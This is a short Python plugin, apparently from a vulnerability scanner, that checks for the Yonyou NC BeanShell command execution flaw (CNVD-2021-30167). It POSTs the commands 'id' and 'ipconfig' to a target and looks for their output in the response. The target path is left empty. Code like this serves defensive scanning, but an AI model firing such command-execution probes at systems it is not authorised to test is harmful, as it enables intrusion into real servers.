#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '用友NC BeanShell 命令执行漏洞CNVD-2021-30167',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'application/x-www-form-urlencoded'
      }
  target = ''
  data1 = 'id'
  data2 = 'ipconfig'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data1,timeout=5,verify=False)
    if res.status_code == 200 and 'BeanShell Test Servlet' in res.text and re.search(r'uid.*?gid.*?groups.*?',res.text,re.S):
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    res=requests.post(url=url1,headers=headers,data=data2,timeout=5,verify=False)
    if res.status_code == 200 and 'BeanShell Test Servlet' in res.text and re.search(r'Windows IP.*?IPv',res.text,re.S) and 'DNS' in res.text:
      # ret['huixian'] = res.text
      ret['ifbug'] = True
      res.close()
      return ret
    else:
      return ret
  except:
    return ret